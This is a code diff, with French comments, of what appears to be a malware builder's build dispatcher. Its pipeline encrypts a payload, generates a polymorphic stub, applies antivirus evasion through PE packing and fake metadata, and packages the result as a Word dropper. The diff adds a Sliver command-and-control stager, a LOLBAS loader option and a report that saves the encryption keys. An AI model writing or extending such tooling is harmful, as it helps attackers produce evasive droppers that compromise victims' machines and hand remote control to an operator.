@@ -1,4 +1,5 @@
 import os
+import json
 from datetime import datetime
 
 from .logger import Logger
@@ -8,6 +9,9 @@ from modules.stub.stubgen import StubGenerator
 from modules.evasion.pe_packer import PEPacker
 from modules.evasion.metafaker import MetaFaker
 from documents.word_dropper.generate_doc import WordDropperGenerator
+from modules.loaders.lolbas_loader import LOLBASLoader
+from modules.stagers.stager_sliver import SliverStager  # nouveau
+from modules.report.report_generator import ReportGenerator  # à venir
 
 
 class BuildDispatcher:
@@ -19,13 +23,11 @@ class BuildDispatcher:
         self.output_path = os.path.join(config['output_dir'], self.build_id)
 
     def log(self, message):
-        """📣 Logger interne + callback GUI/CLI"""
         self.logger.log(message)
         if self.log_callback:
             self.log_callback(message)
 
     def build_all(self):
-        """🔁 Pipeline complet de génération"""
         try:
             os.makedirs(self.output_path, exist_ok=True)
 
@@ -38,20 +40,35 @@ class BuildDispatcher:
             self.log("🧬 Phase 3 : Génération du stub polymorphe...")
             stub_path = self._generate_stub(encrypted_data, keys)
 
-            self.log("🕵️ Phase 4 : Ajout des techniques d'évasion...")
+            self.log("🕵️ Phase 4 : Techniques d'évasion...")
             evaded_stub = self._apply_evasion(stub_path)
 
-            self.log("📄 Phase 5 : Génération du format final...")
+            self.log("🚀 Phase 5 : Génération du format final...")
             final_output = self._generate_output(evaded_stub)
 
-            self.log(f"✅ Build terminé : {final_output}")
+            # Optional: Génération stager Sliver
+            if self.config.get("c2_stager") == "sliver":
+                self.log("📡 Ajout du stager Sliver...")
+                SliverStager().generate(final_output, self.output_path)
+
+            # Optional: Loader LOLBAS
+            if self.config.get("lolbas_loader"):
+                technique = self.config["lolbas_loader"]
+                self.log(f"🎯 Génération loader LOLBAS : {technique}")
+                loader_path = LOLBASLoader().generate_loader(technique, final_output, self.output_path)
+                final_output = loader_path
+
+            # Rapport final
+            self._generate_report(final_output, encrypted_data, keys)
+
+            self.log(f"✅ Build terminé avec succès ! Fichier final : {final_output}")
             return True, final_output
 
         except Exception as e:
             self.log(f"❌ Build échoué : {e}")
             return False, None
 
-    # === Phases internes ===
+    # === PHASES INTERNES ===
 
     def _prepare_payload(self):
         preparer = PayloadPreparer()
@@ -66,7 +83,6 @@ class BuildDispatcher:
         return stub_gen.generate_stub(encrypted_data, keys, self.output_path)
 
     def _apply_evasion(self, stub_path):
-        """🧪 PE packer + fake metadata selon niveau"""
         if self.config['evasion_level'] in ['High', 'Maximum']:
             packed = PEPacker().pack(stub_path)
             faked = MetaFaker().add_fake_metadata(packed)
@@ -74,11 +90,25 @@ class BuildDispatcher:
         return stub_path
 
     def _generate_output(self, final_stub):
-        """📦 Génère le document ou retourne l'EXE final"""
-        fmt = self.config.get('target_format', 'EXE')
-
-        if fmt in ['Word', 'Word Document']:
+        fmt = self.config.get('target_format', 'Standalone EXE')
+        if fmt.lower() in ['word', 'word document']:
             return WordDropperGenerator().generate(final_stub, self.output_path)
-
-        # Ajoute ici les futurs formats (DLL, Excel, etc.)
         return final_stub
+
+    def _generate_report(self, output_file, ciphertext, keys):
+        try:
+            report_data = {
+                "build_id": self.build_id,
+                "output_file": output_file,
+                "encryption": self.config.get("encryption_method"),
+                "evasion_level": self.config.get("evasion_level"),
+                "target_format": self.config.get("target_format"),
+                "output_size": os.path.getsize(output_file),
+                "keys": {k: v.hex() if isinstance(v, (bytes, bytearray)) else v for k, v in keys.items()}
+            }
+            report_path = os.path.join(self.output_path, "build_report.json")
+            with open(report_path, "w") as f:
+                json.dump(report_data, f, indent=4)
+            self.log(f"📊 Rapport sauvegardé : {report_path}")
+        except Exception as e:
+            self.log(f"[!] Erreur lors de la génération du rapport : {e}")
